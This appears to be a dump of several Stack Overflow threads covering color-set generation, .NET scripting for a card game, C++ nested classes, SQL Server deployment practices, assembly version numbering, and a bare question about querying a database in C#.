Document
"Function for creating color wheels <p>This is something I've pseudo-solved many times and never quite found a solution. That's stuck with me. The problem is to come up with a way to generate <code>N</code> colors, that are as distinguishable as possible where <code>N</code> is a parameter.</p>
 <p>I've read somewhere the human eye can't distinguish between less than 4 values apart. so This is something to keep in mind. The following algorithm does not compensate for this.</p>

<p>I'm not sure this is exactly what you want, but this is one way to randomly generate non-repeating color values:</p>

<p>(beware, inconsistent pseudo-code ahead)</p>

<pre><code>//colors entered as 0-255 [R, G, B]<br>colors = []; //holds final colors to be used<br>rand = new Random();<br><br>//assumes n is less than 16,777,216<br>randomGen(int n){<br>   while (len(colors) &lt; n){<br>      //generate a random number between 0,255 for each color<br>      newRed = rand.next(256);<br>      newGreen = rand.next(256);<br>      newBlue = rand.next(256);<br>      temp = [newRed, newGreen, newBlue];<br>      //only adds new colors to the array<br>      if temp not in colors {<br>         colors.append(temp);<br>      }<br>   }<br>}<br></code></pre>

<p>One way you could optimize this for better visibility would be to compare the distance between each new color and all the colors in the array:</p>

<pre><code>for item in color{<br>   itemSq = (item[0]^2 + item[1]^2 + item[2]^2])^(.5);<br>   tempSq = (temp[0]^2 + temp[1]^2 + temp[2]^2])^(.5);<br>   dist = itemSq - tempSq;<br>   dist = abs(dist);<br>}<br>//NUMBER can be your chosen distance apart.<br>if dist &lt; NUMBER and temp not in colors {<br>   colors.append(temp);<br>}<br></code></pre>

<p>But this approach would significantly slow down your algorithm.</p>

<p>Another way would be to scrap the randomness and systematically go through every 4 values and add a color to an array in the above example.</p> <p>Isn't it also a factor which order you set up the colors?</p>

<p>Like if you use Dillie-Os idea you need to mix the colors as much as possible. 
0 64 128 256 is from one to the next. but 0 256 64 128 in a wheel would be more ""apart""</p>

<p>Does this make sense?</p> <p>My first thought on this is ""how generate N vectors in a space that maximize distance from each other."" You can see that the RGB (or any other scale you use that forms a basis in color space) are just vectors. Take a look at <a href=""http://mathworld.wolfram.com/topics/RandomPointPicking.html"">Random Point Picking</a>. Hope this is a good start for you! Once you have a set of vectors that are maximized a part, you can save them in a hash table or something for later, and just perform random rotations on them to get all the colors you desire that are maximally apart from each other!</p>

<p><strong>Edit:</strong> Thinking about this problem more, it would be better to map the colors in a linear manor, possibly (0,0,0) --> (255,255,255) lexicographically, and then distribute them evenly. I really don't know how well this will work, but it should since, lets say:</p>

<p>n = 10
we know we have 16777216 colors (256^3). We can use <a href=""http://stackoverflow.com/questions/561/using-combinations-of-sets-as-test-data#794"">buckles algorithm 515</a> to find the lexicographically indexed color.<img src=""http://i.stack.imgur.com/gEuCs.gif"" alt=""\frac {\binom {256^3} {3}} {n} * i"">. You'll probably have to edit the algorithm to avoid overflow and probably add some minor speed improvements.</p>
 <p>It would be best to find colors maximally distant in a ""perceptually uniform"" colorspace, e.g. CIELAB (using Euclidean distance between L*, a*, b* coordinates as your distance metric) and then converting to the colorspace of your choice.  Perceptual uniformity is achieved by tweaking the colorspace to approximate the non-linearities in the human visual system.</p>
 <p>Some related resources:</p>

<p><a href=""http://colorbrewer.org"">ColorBrewer</a> - Sets of colours designed to be maximally distinguishable for use on maps.</p>

<p><a href=""http://epub.wu-wien.ac.at/dyn/openURL?id=oai:epub.wu-wien.ac.at:epub-wu-01_c87"">Escaping RGBland: Selecting Colors for Statistical Graphics</a> - A technical report describing a set of algorithms for generating good (i.e. maximally distinguishable) colour sets in the hcl colour space.</p>
 <p>Here is some code to allocate RGB colors evenly around a HSL color wheel of specified luminosity.</p>

<pre><code>class cColorPicker
{
public:
    void Pick( vector&lt;DWORD&gt;&amp;v_picked_cols, int count, int bright = 50 );
private:
    DWORD HSL2RGB( int h, int s, int v );
    unsigned char ToRGB1(float rm1, float rm2, float rh);
};
/**

  Evenly allocate RGB colors around HSL color wheel

  @param[out] v_picked_cols  a vector of colors in RGB format
  @param[in]  count   number of colors required
  @param[in]  bright  0 is all black, 100 is all white, defaults to 50

  based on Fig 3 of http://epub.wu-wien.ac.at/dyn/virlib/wp/eng/mediate/epub-wu-01_c87.pdf?ID=epub-wu-01_c87

*/

void cColorPicker::Pick( vector&lt;DWORD&gt;&amp;v_picked_cols, int count, int bright )
{
    v_picked_cols.clear();
    for( int k_hue = 0; k_hue &lt; 360; k_hue += 360/count )
        v_picked_cols.push_back( HSL2RGB( k_hue, 100, bright ) );
}
/**

  Convert HSL to RGB

  based on http://www.codeguru.com/code/legacy/gdi/colorapp_src.zip

*/

DWORD cColorPicker::HSL2RGB( int h, int s, int l )
{
    DWORD ret = 0;
    unsigned char r,g,b;

    float saturation = s / 100.0f;
    float luminance = l / 100.f;
    float hue = (float)h;

    if (saturation == 0.0) 
    {
      r = g = b = unsigned char(luminance * 255.0);
    }
    else
    {
      float rm1, rm2;

      if (luminance &lt;= 0.5f) rm2 = luminance + luminance * saturation;  
      else                     rm2 = luminance + saturation - luminance * saturation;
      rm1 = 2.0f * luminance - rm2;   
      r   = ToRGB1(rm1, rm2, hue + 120.0f);   
      g = ToRGB1(rm1, rm2, hue);
      b  = ToRGB1(rm1, rm2, hue - 120.0f);
    }

    ret = ((DWORD)(((BYTE)(r)|((WORD)((BYTE)(g))&lt;&lt;8))|(((DWORD)(BYTE)(b))&lt;&lt;16)));

    return ret;
}


unsigned char cColorPicker::ToRGB1(float rm1, float rm2, float rh)
{
  if      (rh &gt; 360.0f) rh -= 360.0f;
  else if (rh &lt;   0.0f) rh += 360.0f;

  if      (rh &lt;  60.0f) rm1 = rm1 + (rm2 - rm1) * rh / 60.0f;   
  else if (rh &lt; 180.0f) rm1 = rm2;
  else if (rh &lt; 240.0f) rm1 = rm1 + (rm2 - rm1) * (240.0f - rh) / 60.0f;      

  return static_cast&lt;unsigned char&gt;(rm1 * 255);
}

int _tmain(int argc, _TCHAR* argv[])
{
    vector&lt;DWORD&gt; myCols;
    cColorPicker colpick;
    colpick.Pick( myCols, 20 );
    for( int k = 0; k &lt; (int)myCols.size(); k++ )
        printf(""%d: %d %d %d\n"", k+1,
        ( myCols[k] &amp; 0xFF0000 ) &gt;&gt;16,
        ( myCols[k] &amp; 0xFF00 ) &gt;&gt;8,
        ( myCols[k] &amp; 0xFF ) );

    return 0;
}
</code></pre>
 <p>Last I checked <a href=""http://www.jfree.org/jfreechart/"" rel=""nofollow"">JFreeChart</a> has this precise algorithm and as it is open source you can check out what it does.  I do know that the colors I get do not seem to be randomly spaced along some circle or sphere, but rather chosen more specifically.</p>
 <p>I know this an old post but I found it while looking for a PHP solution to the topic and finally came with a simple solution:</p>

<pre><code>function random_color($i = null, $n = 10, $sat = .5, $br = .7) {
    $i = is_null($i) ? mt_rand(0,$n) : $i;
    $rgb = hsv2rgb(array($i*(360/$n), $sat, $br));
    for ($i=0 ; $i&lt;=2 ; $i++) 
        $rgb[$i] = dechex(ceil($rgb[$i]));
    return implode('', $rgb);
}

function hsv2rgb($c) { 
    list($h,$s,$v)=$c; 
    if ($s==0) 
        return array($v,$v,$v); 
    else { 
        $h=($h%=360)/60; 
        $i=floor($h); 
        $f=$h-$i; 
        $q[0]=$q[1]=$v*(1-$s); 
        $q[2]=$v*(1-$s*(1-$f)); 
        $q[3]=$q[4]=$v; 
        $q[5]=$v*(1-$s*$f); 
        return(array($q[($i+4)%6]*255,$q[($i+2)%6]*255,$q[$i%6]*255)); //[1] 
    } 
}
</code></pre>

<p>So just call the random_color() function where $i identifies the color, $n the number of possible colors, $sat the saturation and $br the brightness.</p>
 <p>To achieve ""most distinguishable"" we need to use a perceptual color space like Lab (or any other perceptually linear color space) and not RGB. Also, we can quantize this space to reduce the size of the space.</p>

<p>Generate the full 3D space with all possible quantized entries and run the K-means algorithm with <code>k=N</code>. The resulting centers/ ""means"" should be approximately most distinguishabl from each other. </p>
"
"Adding scripting functionality to .NET applications <p>I have a little game written in C#. It uses a database as back-end. It's 
a <a href=""http://en.wikipedia.org/wiki/Collectible_card_game"">trading card game</a>, and I wanted to implement the function of the cards as a script.</p>

<p>What I mean is that I essentially have an interface, <code>ICard</code>, which a card class implements (<code>public class Card056 : ICard</code>) and which contains function that are called by the game.</p>

<p>Now, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).</p>

<p>Is that possible? Register a class from a source file and then instantiate it, etc.</p>

<pre><code>ICard Cards[current] = new MyGame.CardLibrary.Card056();
Cards[current].OnEnterPlay(ref currentGameState);
</code></pre>

<p>The language is C#, but extra bonus if it's possible to write the script in any .NET language.</p>
 <p>Yes, I thought about that, but I soon figured out that another Domain-Specific-Language (DSL) would be a bit too much.</p>

<p>Essentially, they need to interact with my gamestate in possibly unpredictable ways. For example, a card could have a rule ""When this cards enter play, all your undead minions gain +3 attack against flying enemies, except when the enemy is blessed"". As trading card games are turn based, the GameState Manager will fire OnStageX events and let the cards modify other cards or the GameState in whatever way the card needs.</p>

<p>If I try to create a DSL, I have to implement a rather large feature set and possibly constantly update it, which shifts the maintenance work to another part without actually removing it.</p>

<p>That's why I wanted to stay with a ""real"" .NET language to essentially be able to just fire the event and let the card manipulate the gamestate in whatever way (within the limits of the code access security).</p>
 <p><a href=""http://www.codeproject.com/Articles/8656/C-Script-The-Missing-Puzzle-Piece"">Oleg Shilo's C# Script solution (at The Code Project</a>) really is a great introduction to providing script abilities in your application.</p>

<p>A different approach would be to consider a language that is specifically built for scripting, such as <a href=""http://en.wikipedia.org/wiki/IronRuby"">IronRuby</a>, <a href=""http://en.wikipedia.org/wiki/IronPython"">IronPython</a>, or <a href=""http://en.wikipedia.org/wiki/Lua_%28programming_language%29"">Lua</a>.</p>

<p>IronPython and IronRuby are both available today.</p>

<p>For a guide to embedding IronPython read
<a href=""http://blogs.msdn.com/b/jmstall/archive/2005/09/01/howto-embed-ironpython.aspx"">How to embed IronPython script support in your existing app in 10 easy steps</a>.</p>

<p>Lua is a scripting language commonly used in games. There is a Lua compiler for .NET, available from CodePlex -- <a href=""http://www.codeplex.com/Nua"">http://www.codeplex.com/Nua</a></p>

<p>That codebase is a great read if you want to learn about building a compiler in .NET.</p>

<p>A different angle altogether is to try <a href=""http://en.wikipedia.org/wiki/Windows_PowerShell"">PowerShell</a>. There are numerous examples of embedding PowerShell into an application -- here's a thorough project on the topic: 
<a href=""http://code.msdn.microsoft.com/PowerShellTunnel/Wiki/View.aspx?title=PowerShellTunnel%20Reference"">Powershell Tunnel</a></p>
 <p>You might be able to use IronRuby for that. </p>

<p>Otherwise I'd suggest you have a directory where you place precompiled assemblies. Then you could have a reference in the DB to the assembly and class, and use reflection to load the proper assemblies at runtime.</p>

<p>If you really want to compile at run-time you could use the CodeDOM, then you could use reflection to load the dynamic assembly. <a href=""http://msdn.microsoft.com/en-us/library/microsoft.csharp.csharpcodeprovider.aspx"">MSDN article which might help</a>.</p> <P>You could use any of the DLR languages, which provide a way to really easily host your own scripting platform. However, you don't have to use a scripting language for this. You could use C# and compile it with the C# code provider. As long as you load it in its own AppDomain, you can load and unload it to your heart's content.</P> <p>If you don't want to use the DLR you can <a href=""http://docs.codehaus.org/display/BOO/Boo+as+an+embedded+scripting+language"" rel=""nofollow"">use Boo (which has an interpreter)</a> or you could consider <a href=""http://www.codeplex.com/scriptdotnet"" rel=""nofollow"">the Script.NET (S#) project on CodePlex</a>. With the Boo solution you can choose between compiled scripts or using the interpreter, and Boo makes a nice scripting language, has a flexible syntax and an extensible language via its open compiler architecture. Script.NET looks nice too, though, and you could easily extend that language as well as its an open source project and uses a very friendly Compiler Generator (<a href=""http://www.codeplex.com/irony"" rel=""nofollow"">Irony.net</a>).</p> <p>The main application that my division sells does something very similar to provide client customisations (which means that I can't post any source). We have a C# application that loads dynamic VB.NET scripts (although any .NET language could be easily supported - VB was chosen because the customisation team came from an ASP background).</p>

<p>Using .NET's CodeDom we compile the scripts from the database, using the VB <code>CodeDomProvider</code> (annoyingly it defaults to .NET 2, if you want to support 3.5 features you need to pass a dictionary with ""CompilerVersion"" = ""v3.5"" to its constructor). Use the <code>CodeDomProvider.CompileAssemblyFromSource</code> method to compile it (you can pass settings to force it to compile in memory only.</p>

<p>This would result in hundreds of assemblies in memory, but you could put all the dynamic classes' code together into a single assembly, and recompile the whole lot when any change. This has the advantage that you could add a flag to compile on disk with a <a href=""http://en.wikipedia.org/wiki/Program_database"" rel=""nofollow"">PDB</a> for when you're testing, allowing you to debug through the dynamic code.</p>
 <p>I'd suggest using <a href=""http://luaforge.net/projects/luainterface/"">LuaInterface</a> as it has fully implemented Lua where it appears that Nua is not complete and likely does not implement some very useful functionality (coroutines, etc).</p>

<p>If you want to use some of the outside prepacked Lua modules, I'd suggest using something along the lines of 1.5.x as opposed to the 2.x series that builds fully managed code and cannot expose the necessary C API.</p>
 <p>The next version of .NET (5.0?) has had a lot of talk about opening the ""compiler as a service"" which would make things like direct script evaluation possible.</p>
 <p>I'm using LuaInterface1.3 + Lua 5.0 for NET1.1 application.</p>

<p>The issue with Boo is that everytime you parse/compile/eval your code on the fly, it creates a set of boo classes so you will get memory leaks.</p>

<p>Lua in the other hand, does not do that, so it's very very stable and works wonderful (I can pass objects from C# to Lua and backwards).</p>

<p>So far I havent put it in PROD yet, but seems very promising.</p>

<p>UPDATE: <strong>I did have memory leaks issues in PROD using LuaInterface + Lua 5.0</strong>, therefore I used Lua 5.2 and linked directly into C# with DllImport. <strong>The memory leaks were inside the LuaInterface library.</strong></p>

<p>Lua 5.2: from <a href=""http://luabinaries.sourceforge.net"" rel=""nofollow"">http://luabinaries.sourceforge.net</a> and <a href=""http://sourceforge.net/projects/luabinaries/files/5.2/Windows%20Libraries/Dynamic/lua-5.2_Win32_dll7_lib.zip/download"" rel=""nofollow"">http://sourceforge.net/projects/luabinaries/files/5.2/Windows%20Libraries/Dynamic/lua-5.2_Win32_dll7_lib.zip/download</a></p>

<p>Once I did this, all my memory leaks were gone and the app was very stable.</p>
"
"Should I use nested classes in this case? <p>I am working on a collection of classes used for video playback and recording. I have one main class which acts like the public interface, with methods like <code>play()</code>, <code>stop()</code>, <code>pause()</code>, <code>record()</code> etc... Then I have workhorse classes which do the video decoding and video encoding. </p>

<p>I just learned about the existence of nested classes in C++, and I'm curious to know what programmers think about using them. I am a little wary and not really sure what the benefits/drawbacks are, but they seem (according to the book I'm reading) to be used in cases such as mine.</p>

<p>The book suggests that in a scenario like mine, a good solution would be to nest the workhorse classes inside the interface class, so there are no separate files for classes the client is not meant to use, and to avoid any possible naming conflicts? I don't know about these justifications. Nested classes are a new concept to me. Just want to see what programmers think about the issue.</p>
 <p>I would be a bit reluctant to use nested classes here.  What if you created an abstract base class for a ""multimedia driver"" to handle the back-end stuff (workhorse), and a separate class for the front-end work?  The front-end class could take a pointer/reference to an implemented driver class (for the appropriate media type and situation) and perform the abstract operations on the workhorse structure.</p>

<p>My philosophy would be to go ahead and make both structures accessible to the client in a polished way, just under the assumption they would be used in tandem.</p>

<p>I would reference something like a <a href=""http://qt-project.org/doc/qt-4.8/qtextdocument.html"">QTextDocument</a> in Qt.  You provide a direct interface to the bare metal data handling, but pass the authority along to an object like a QTextEdit to do the manipulation.</p>
 <p>One way of deciding whether or not to use nested classes is to think whether or not this class plays a supporting role or it's own part.</p>

<p>If it exists solely for the purpose of helping another class then I generally make it a nested class. There are a whole load of caveats to that, some of which seem contradictory but it all comes down to experience and gut-feeling.</p> <p>sounds like a case where you could use the <a href=""http://en.wikipedia.org/wiki/Strategy_pattern"" rel=""nofollow"">strategy pattern</a></p> <p>Sometimes it's appropriate to hide the implementation classes from the user -- in these cases it's better to put them in an foo_internal.h than inside the public class definition. That way, readers of your foo.h will not see what you'd prefer they not be troubled with, but you can still write tests against each of the concrete implementations of your interface.</p>
 <p>You would use a nested class to create a (small) helper class that's required to implement the main class. Or for example, to define an interface (a class with abstract methods).</p>

<p>In this case, the main disadvantage of nested classes is that this makes it harder to re-use them. Perhaps you'd like to use your VideoDecoder class in another project. If you make it a nested class of VideoPlayer, you can't do this in an elegant way.</p>

<p>Instead, put the other classes in separate .h/.cpp files, which you can then use in your VideoPlayer class. The client of VideoPlayer now only needs to include the file that declares VideoPlayer, and still doesn't need to know about how you implemented it.</p>
 <p>You should use an inner class only when you cannot implement it as a separate class using the would-be outer class' public interface.  Inner classes increase the size, complexity, and responsibility of a class so they should be used sparingly.</p>

<p>Your encoder/decoder class sounds like it better fits the <a href=""http://en.wikipedia.org/wiki/Strategy_pattern"" rel=""nofollow"">Strategy Pattern</a></p>
 <p>One reason to avoid nested classes is if you ever intend to wrap the code with swig (<a href=""http://www.swig.org"" rel=""nofollow"">http://www.swig.org</a>) for use with other languages. Swig currently has problems with nested classes, so interfacing with libraries that expose any nested classes becomes a real pain.</p>
 <p>We hit an issue with a semi-old Sun C++ compiler and visibility of nested classes which behavior changed in the standard.  This is not a reason to not do your nested class, of course, just something to be aware of if you plan on compiling your software on lots of platforms including old compilers.</p>
 <p>Another thing to keep in mind is whether you ever envision different implementations of your work functions (such as decoding and encoding). In that case, you would definitely want an abstract base class with different concrete classes which implement the functions. It would not really be appropriate to nest a separate subclass for each type of implementation.</p>
 <p>Well, if you use pointers to your workhorse classes in your Interface class and don't expose them as parameters or return types in your interface methods, you will not need to include the definitions for those work horses in your interface header file (you just forward declare them instead). That way, users of your interface will not need to know about the classes in the background. </p>

<p>You definitely don't need to nest classes for this. In fact, separate class files will actually make your code a lot more readable and easier to manage as your project grows. it will also help you later on if you need to subclass (say for different content/codec types).</p>

<p>Here's more information on the <a href=""http://www.apibook.com/Chapter_3.pdf"" rel=""nofollow"">PIMPL pattern</a> (section 3.1.1).</p>
"
"Deploying SQL Server Databases from Test to Live <p>I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.
Now, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.</p>

<p>Would you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).</p>

<p>Or - given the lack of ""EXPLAIN CREATE TABLE"" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).</p>

<p>And lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.</p>

<p>Now, i hear a lot of great stuff about the <a href=""http://www.red-gate.com/products/index.htm"">Red Gate</a> products, but for hobby projects, the price is a bit steep.</p>

<p>So, what are you using to automatically deploy SQL Server Databases from Test to Live?</p>
 <p>For my projects I alternate between SQL Compare from REd Gate and the Database Publishing Wizard from Microsoft which you can download free
<a href=""http://www.microsoft.com/downloads/details.aspx?familyid=56E5B1C5-BF17-42E0-A410-371A838E570A&amp;displaylang=en"">here</a>.</p>

<p>The Wizard isn't as slick as SQL Compare or SQL Data Compare but it does the trick. One issue is that the scripts it generates may need some rearranging and/or editing to flow in one shot.</p>

<p>On the up side, it can move your schema and data which isn't bad for a free tool.</p> <p>I've taken to hand-coding all of my DDL (creates/alter/delete) statements, adding them to my .sln as text files, and using normal versioning (using subversion, but any revision control should work). This way, I not only get the benefit of versioning, but updating live from dev/stage is the same process for code and database - tags, branches and so on work all the same.</p>

<p>Otherwise, I agree redgate is expensive if you don't have a company buying it for you. If you can get a company to buy it for you though, it really is worth it!</p> <p>If you have a company buying it, Toad from Quest Software has this kind of management functionality built in.  It's basically a two-click operation to compare two schemas and generate a sync script from one to the other.</p>

<p>They have editions for most of the popular databases, including of course Sql Server.</p> <p>I work the same way Karl does, by keeping all of my SQL scripts for creating and altering tables in a text file that I keep in source control.  In fact, to avoid the problem of having to have a script examine the live database to determine what ALTERs to run, I usually work like this:</p>

<ul>
<li>On the first version, I place everything during testing into one SQL script, and treat all tables as a CREATE.  This means I end up dropping and readding tables a lot during testing, but that's not a big deal early into the project (since I'm usually hacking the data I'm using at that point anyway).</li>
<li>On all subsequent versions, I do two things: I make a new text file to hold the upgrade SQL scripts, that contain just the ALTERs for that version.  And I make the changes to the original, create a fresh database script as well.  This way an upgrade just runs the upgrade script, but if we have to recreate the DB we don't need to run 100 scripts to get there.</li>
<li>Depending on how I'm deploying the DB changes, I'll also usually put a version table in the DB that holds the version of the DB.  Then, rather than make any human decisions about which scripts to run, whatever code I have running the create/upgrade scripts uses the version to determine what to run.</li>
</ul>

<p>The one thing this will not do is help if part of what you're moving from test to production is data, but if you want to manage structure and not pay for a nice, but expensive DB management package, is really not very difficult.  I've also found it's a pretty good way of keeping mental track of your DB.</p> <p>I agree that scripting everything is the best way to go and is what I advocate at work.  You should script everything from DB and object creation to populating your lookup tables.</p>

<p>Anything you do in UI only won't translate (especially for changes... not so much for first deployments) and will end up requiring a tools like what Redgate offers.</p> <p>Using SMO/DMO, it isn't too difficult to generate a script of your schema.  Data is a little more fun, but still doable.</p>

<p>In general, I take ""Script It"" approach, but you might want to consider something along these lines:</p>

<ul>
<li>Distinguish between Development and Staging, such that you can Develop with a subset of data ... this I would create a tool to simply pull down some production data, or generate fake data where security is concerned.</li>
<li>For team development, each change to the database will have to be coordinated amongst your team members.  Schema and data changes can be intermingled, but a single script should enable a given feature.  Once all your features are ready, you bundle these up in a single SQL file and run that against a restore of production.</li>
<li>Once your staging has cleared acceptance, you run the single SQL file again on the production machine.</li>
</ul>

<p>I have used the Red Gate tools and they are <strong>great</strong> tools, but if you can't afford it, building the tools and working this way isn't too far from the ideal.</p> <p>Like Rob Allen, I use SQL Compare / Data Compare by Redgate. I also use the Database publishing wizard by Microsoft. I also have a console app I wrote in C# that takes a sql script and runs it on a server. This way you can run large scripts with 'GO' commands in it from a command line or in a batch script.</p>

<p>I use Microsoft.SqlServer.BatchParser.dll and Microsoft.SqlServer.ConnectionInfo.dll libraries in the console application.</p>
 <p>I agree with keeping everything in source control and manually scripting all changes.  Changes to the schema for a single release go into a script file created specifically for that release.  All stored procs, views, etc should go into individual files and treated just like .cs or .aspx as far as source control goes.  I use a powershell script to generate one big .sql file for updating the programmability stuff.</p>

<p>I don't like automating the application of schema changes, like new tables, new columns, etc.  When doing a production release, I like to go through the change script command by command to make sure each one works as expected.  There's nothing worse than running a big change script on production and getting errors because you forgot some little detail that didn't present itself in development.</p>

<p>I have also learned that indexes need to be treated just like code files and put into source control.</p>

<p>And you should definitely have more than 2 databases - dev and live.  You should have a dev database that everybody uses for daily dev tasks.  Then a staging database that mimics production and is used to do your integration testing.  Then maybe a complete recent copy of production (restored from a full backup), if that is feasible, so your last round of installation testing goes against something that is as close to the real thing as possible.</p>
 <p>Don't forget Microsoft's solution to the problem: <a href=""http://msdn.microsoft.com/en-gb/vsts2008/products/bb933747.aspx"" rel=""nofollow"">Visual Studio 2008 Database Edition</a>.  Includes tools for deploying changes to databases, producing a diff between databases for schema and/or data changes, unit tests, test data generation.</p>

<p>It's pretty expensive but I used the trial edition for a while and thought it was brilliant.  It makes the database as easy to work with as any other piece of code.</p>
 <p>I do all my database creation as DDL and then wrap that DDL into a schema maintainence class. I may do various things to create the DDL in the first place but fundamentally I do all the schema maint in code. This also means that if one needs to do non DDL things that don't map well to SQL you can write procedural logic and run it between lumps of DDL/DML.</p>

<p>My dbs then have a table which defines the current version so one can code a relatively straightforward set of tests:</p>

<ol>
<li>Does the DB exist? If not create it.</li>
<li>Is the DB the current version? If not then run the methods, in sequence, that bring the schema up to date (you may want to prompt the user to confirm and - ideally - do backups at this point).</li>
</ol>

<p>For a single user app I just run this in place, for a web app we currently to lock the user out if the versions don't match and have a stand alone schema maint app we run. For multi-user it will depend on the particular environment.</p>

<p>The advantage? Well I have a very high level of confidence that the schema for the apps that use this methodology is consistent across all instances of those applications. Its not perfect, there are issues, but it works...</p>

<p>There are some issues when developing in a team environment but that's more or less a given anyway!</p>

<p>Murph</p>
 <p>I'm using Subsonic's migrations mechanism so I just have a dll with classes in squential order that have 2 methods, up and down. There is a continuous integration/build script hook into nant, so that I can automate the upgrading of my database.</p>

<p>Its not the best thign in the world, but it beats writing DDL.</p>
 <p><a href=""http://www.red-gate.com/products/SQL_Compare/index.htm"" rel=""nofollow"">RedGate SqlCompare</a> is a way to go in my opinion. We do DB deployment on a regular basis and since I started using that tool I have never looked back. 
Very intuitive interface and saves a lot of time in the end.</p>

<p>The Pro version will take care of scripting for the source control integration as well.</p>
 <p>I'm currently working the same thing to you. Not only deploying SQL Server databases from test to live but also include the whole process from Local -> Integration -> Test -> Production. So what can make me easily everyday is I do <a href=""http://tech.wowkhmer.com/post/2008/11/11/NAnt-task-with-Red-Gate-SQL-Compare.aspx"" rel=""nofollow"">NAnt task with Red-Gate SQL Compare</a>. I'm not working for RedGate but I have to say it is good choice.</p>
 <p>I also maintain scripts for all my objects and data. For deploying I wrote this free utility - <a href=""http://www.sqldart.com"" rel=""nofollow"">http://www.sqldart.com</a>. It'll let you reorder your script files and will run the whole lot within a transaction.</p>
"
"Automatically update version number <p>I would like the version property of my application to be incremented for each build but I'm not sure on how to enable this functionality in Visual Studio (2005/2008). I have tried to specify the AssemblyVersion as 1.0.* but it doesn't get me exactly what I want. </p>

<p>I'm also using a settings file and in earlier attempts when the assembly version changed my settings got reset to the default since the application looked for the settings file in another directory. </p>

<p>I would like to be able to display a version number in the form of 1.1.38 so when a user finds a problem I can log the version they are using as well as tell them to upgrade if they have an old release.</p>

<p>A short explanation of how the versioning works would also be appreciated. When does the build and revision number get incremented?</p> <p>With the ""Built in"" stuff, you can't, as using 1.0.* or 1.0.0.* will replace the revision and build numbers with a coded date/timestamp, which is usually also a good way. </p>

<p>For more info, see the <a href=""http://msdn2.microsoft.com/en-us/library/c405shex%28vs.80%29.aspx"">Assembly Linker</a> Documentation in the /v tag.</p>

<p>As for automatically incrementing numbers, use the AssemblyInfo Task:</p>

<p><a href=""http://code.msdn.microsoft.com/AssemblyInfoTaskvers"">AssemblyInfo Task</a></p>

<p>This can be configured to automatically increment the build number.</p>

<p>There are 2 Gotchas:</p>

<ol>
<li>Each of the 4 numbers in the Version string is limited to 65535. This is a Windows Limitation and unlikely to get fixed.
<ul>
<li><a href=""http://blogs.msdn.com/msbuild/archive/2007/01/03/why-are-build-numbers-limited-to-65535.aspx"">Why are build numbers limited to 65535?</a></li>
</ul></li>
<li>Using with with Subversion requires a small change:
<ul>
<li><a href=""http://www.andrewconnell.com/blog/archive/2006/08/29/4078.aspx"">Using MSBuild to generate assembly version info at build time (including SubVersion fix)</a></li>
</ul></li>
</ol>

<p>Retrieving the Version number is then quite easy:</p>

<pre><code>Version v = Assembly.GetExecutingAssembly().GetName().Version;
string About = string.Format(CultureInfo.InvariantCulture, @""YourApp Version {0}.{1}.{2} (r{3})"", v.Major, v.Minor, v.Build, v.Revision);
</code></pre>

<hr>

<p>And, to clarify: In .net or at least in C#, the build is actually the THIRD number, not the fourth one as some people (for example Delphi Developers who are used to Major.Minor.Release.Build) might expect.</p>

<p>In .net, it's Major.Minor.Build.Revision.</p>
 <p>What source control system are you using? </p>

<p>Almost all of them have some form of $ Id $ tag that gets expanded when the file is checked in.</p>

<p>I usually use some form of hackery to display this as the version number.</p>

<p>The other alternative is use to use the date as the build number: 080803-1448</p> <p>Some time ago I wrote a quick and dirty exe that would update the version #'s in an assemblyinfo.{cs/vb} - I also have used rxfind.exe (a simple and powerful regex-based search replace tool) to do the update from a command line as part of the build process.  A couple of other helpfule hints:</p>

<ol>
<li>separate the assemblyinfo into product parts (company name, version, etc.) and assembly specific parts (assembly name etc.).  See <a href=""http://blog.darrenstokes.com/2007/12/17/ease-versioning-multiple-assemblies-by-splitting-up-assemblyinfo/"" rel=""nofollow"">here</a></li>
<li>Also - i use subversion, so I found it helpful to set the build number to subversion revision number thereby making it really easy to always get back to the codebase that generated the assembly (e.g. 1.4.100.1502 was built from revision 1502).</li>
</ol> <p>VS.NET defaults the Assembly version to 1.0.* and uses the following logic when auto-incrementing: it sets the build part to the number of days since January 1st, 2000, and sets the revision part to the number of seconds since midnight, local time, divided by two. See this <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.assemblyversionattribute.assemblyversionattribute.aspx"">MSDN article</a>.</p>

<p>Assembly version is located in an assemblyinfo.vb or assemblyinfo.cs file. From the file: </p>

<pre class=""lang-vb prettyprint-override""><code>' Version information for an assembly consists of the following four values:
'
'      Major Version
'      Minor Version 
'      Build Number
'      Revision
'
' You can specify all the values or you can default the Build and Revision Numbers 
' by using the '*' as shown below:
' &lt;Assembly: AssemblyVersion(""1.0.*"")&gt; 

&lt;Assembly: AssemblyVersion(""1.0.0.0"")&gt; 
&lt;Assembly: AssemblyFileVersion(""1.0.0.0"")&gt; 
</code></pre>
 <p>If you want an auto incrementing number that updates each time a compilation is done, you can use <a href=""http://testdox.wordpress.com/versionupdater/"" rel=""nofollow"">VersionUpdater</a> from a pre-build event. Your pre-build event can check the build configuration if you prefer so that the version number will only increment for a Release build (for example).</p>
 <p>I have found that it works well to simply display the date of the last build using the following wherever a product version is needed:</p>

<pre><code>System.IO.File.GetLastWriteTime(System.Reflection.Assembly.GetExecutingAssembly().Location).ToString(""yyyy.MM.dd.HHMM"")
</code></pre>

<p>Rather than attempting to get the version from something like the following:</p>

<pre><code>System.Reflection.Assembly assembly = System.Reflection.Assembly.GetExecutingAssembly();
object[] attributes = assembly.GetCustomAttributes(typeof(System.Reflection.AssemblyFileVersionAttribute), false);
object attribute = null;

if (attributes.Length &gt; 0)
{
    attribute = attributes[0] as System.Reflection.AssemblyFileVersionAttribute;
}
</code></pre>
"
"How do I connect to a database and loop over a recordset in C#? <p>What's the simplest way to connect and query a database for a set of records in C#?</p>
